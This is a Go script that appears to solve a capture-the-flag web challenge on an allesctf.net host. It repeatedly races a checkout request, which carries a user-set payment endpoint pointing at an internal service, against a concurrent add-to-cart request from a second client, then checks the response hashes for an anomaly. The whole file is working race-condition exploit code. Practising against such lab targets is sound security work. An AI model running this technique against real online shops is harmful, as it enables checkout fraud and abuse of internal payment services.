package main

import (
	"fmt"
	"log"
	"crypto/sha256"
	"encoding/hex"
	"io/ioutil"
	"net/http"
	"strings"
)

const (
	BASE = "http://staywoke.hax1.allesctf.net/"
	ACCOUNT = "1337-420-69-93dcbbcd"
)

var sessionCookie http.Cookie

func GetSession() {
	resp, _ := http.Get(BASE)
	defer resp.Body.Close()
	for _, c := range(resp.Cookies()) {
		if c.Name == "session" {
			sessionCookie = *c
			return
		}
	}

	log.Fatal("could not find session cookie")
}

func Get(client *http.Client, endpoint string) string {
	req, err := http.NewRequest("GET", BASE + endpoint, nil)
	if err != nil {
		log.Fatalf("new request GET %s: %v", endpoint, err)
	}
	req.AddCookie(&sessionCookie)

	r, err := client.Do(req)
	defer r.Body.Close()
	if err != nil {
		log.Fatalf("GET %s: %v", endpoint, err)
	}


	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Fatalf("read body for GET %s: %v", endpoint, err)
	}

	return string(body)
}

func Post(client *http.Client, endpoint, data string) string {
	req, err := http.NewRequest("POST", BASE + endpoint, strings.NewReader(data))
	if err != nil {
		log.Fatalf("new request POST %s: %v", endpoint, err)
	}

	req.Header.Add("Content-Type", "application/json")
	req.AddCookie(&sessionCookie)

	r, err := client.Do(req)
	defer r.Body.Close()
	if err != nil {
		log.Fatalf("POST %s: %v", endpoint, err)
	}


	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Fatalf("read body for POST %s: %v", endpoint, err)
	}

	return string(body)
}

func ClearProducts(client *http.Client) {
	for i := 1; i < 10; i += 1 {
		Post(client, "cart", `{"index": "0"}`)
	}
}


func main() {
	var client http.Client
	var client2 http.Client
	GetSession()

	for tries := 0; tries < 1000; tries += 1 {
		ClearProducts(&client)
		Post(&client, "products/2", "")

		confirm := make(chan string, 1)
		add := make(chan string, 1)
		go func() {
			confirm <- Post(&client, "checkout",
				fmt.Sprintf(
					`{"payment": "w0kecoin", "paymentEndpoint": "http://payment-api:9090", "account": "%s"}`,
					ACCOUNT,
				),
			)
		}()
		go func() {
			add <- Post(&client2, "products/1", "")
		}()

		c := <-confirm
		<-add
		hraw := sha256.Sum256([]byte(c))
		h := hex.EncodeToString(hraw[:])
		if h != "6ea8055f4d98886e3a51718d19942264927731a074b28c28f27a01ea88474c99" && h != "cc260f4e00d978a24adcfe18f895329da17275a03ccff37efbbd120e32a6335c" {
			fmt.Println(h)
			fmt.Println(c)
			break
		}
	}
}
